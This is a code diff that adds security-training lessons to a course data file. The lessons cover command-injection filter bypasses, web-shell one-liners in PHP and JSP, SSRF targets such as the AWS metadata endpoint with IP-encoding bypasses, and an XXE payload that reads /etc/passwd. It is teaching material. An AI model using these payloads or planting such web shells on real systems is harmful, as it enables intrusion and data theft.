@@ -1818,6 +1818,55 @@ ARP (Address Resolution Protocol) has no authentication. It trusts whatever it h
                         `
                     }
                 ]
+            },
+            {
+                id: 'net-m8',
+                title: 'Web-Shells & Command Injection',
+                duration: '45m',
+                lessons: [
+                    {
+                        id: 'command-injection-bypass',
+                        title: 'Advanced Command Injection',
+                        type: 'text',
+                        duration: '25m',
+                        xp: 125,
+                        content: `
+# Advanced Command Injection
+
+## Bypassing Filters
+When simple commands are blocked, use these tricks:
+
+### 1. Bypassing Space Filters
+- **Input Redirection**: \`cat<file\`
+- **IFS Variable**: \`cat\${IFS}file\`
+- **Brace Expansion**: \`{cat,file}\`
+
+### 2. Bypassing Keyword Filters (e.g., "cat", "flag")
+- **Concatenation**: \`c'a't fl'a'g\`
+- **Wildcards**: \`cat /f???\`
+- **Base64**: \`echo Y2F0IC9mbGFn | base64 -d | sh\`
+- **Variables**: \`a=c;b=at; $a$b file\`
+
+## Web Shells
+A web shell is a script that allows remote administration.
+
+**PHP One-Liner:**
+\`\`\`php
+<?php system($_GET['cmd']); ?>
+\`\`\`
+
+**JSP One-Liner:**
+\`\`\`jsp
+<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>
+\`\`\`
+
+**Python One-Liner:**
+\`\`\`python
+import os; os.system("cat /etc/passwd")
+\`\`\`
+                        `
+                    }
+                ]
             }
         ]
     },
@@ -3412,6 +3461,100 @@ Query this to get:
 - User Data (startup scripts)
 
 Use these keys to access S3 buckets or control the account.
+                        `
+                    }
+                ]
+            }
+        ]
+    },
+    {
+        id: 'server-side-attacks',
+        title: 'Server-Side Attacks',
+        description: 'Deep dive into vulnerabilities that execute on the server: SSRF, XXE, and more.',
+        icon: Server,
+        level: 'Advanced',
+        duration: '4h 00m',
+        xp: 2000,
+        modules: [
+            {
+                id: 'ssa-m1',
+                title: 'SSRF',
+                duration: '60m',
+                lessons: [
+                    {
+                        id: 'ssrf-intro',
+                        title: 'SSRF Introduction',
+                        type: 'text',
+                        duration: '30m',
+                        xp: 100,
+                        content: `
+# Server-Side Request Forgery (SSRF)
+
+SSRF allows an attacker to induce the server-side application to make requests to an unintended location.
+
+## Types
+1. **Basic SSRF**: The response is returned to the attacker.
+2. **Blind SSRF**: The backend makes the request, but you don't see the response.
+
+## Impact
+- Access internal systems (127.0.0.1, 192.168.x.x)
+- Read local files (file:///)
+- Access Cloud Metadata (AWS, Google Cloud)
+- Internal Port Scanning
+
+## Common Targets
+- **AWS Metadata**: \`http://169.254.169.254/latest/meta-data/\`
+- **Local Admin Interfaces**: \`http://localhost/admin\`
+- **Internal APIs**
+
+## Bypassing Filters
+- **Decimal IP**: \`2130706433\` (127.0.0.1)
+- **Octal IP**: \`0177.0.0.1\`
+- **DNS Rebinding**: Domain resolves to 1.1.1.1 first, then 127.0.0.1
+                        `
+                    }
+                ]
+            },
+            {
+                id: 'ssa-m2',
+                title: 'XXE Injection',
+                duration: '60m',
+                lessons: [
+                    {
+                        id: 'xxe-intro',
+                        title: 'XML External Entity (XXE)',
+                        type: 'text',
+                        duration: '30m',
+                        xp: 100,
+                        content: `
+# XXE Injection
+
+XXE arises when XML input is parsed with support for external entities.
+
+## The Payload
+\`\`\`xml
+<!DOCTYPE foo [
+  <!ENTITY xxe SYSTEM "file:///etc/passwd">
+]>
+<stockCheck>
+  <productId>&xxe;</productId>
+</stockCheck>
+\`\`\`
+
+## What is happening?
+1. We define a DOCTYPE.
+2. We define an ENTITY named \`xxe\`.
+3. We set its value to the content of \`/etc/passwd\` using the \`SYSTEM\` keyword.
+4. We reference it using \`&xxe;\` in the data.
+5. The parser replaces \`&xxe;\` with the file content.
+
+## Impact
+- Local File Disclosure (LFI)
+- SSRF (via http:// handler)
+- Denial of Service (Billion Laughs Attack)
+
+## Prevention
+Disable DTDs (External Entities) in your XML parser configuration.
                         `
                     }
                 ]
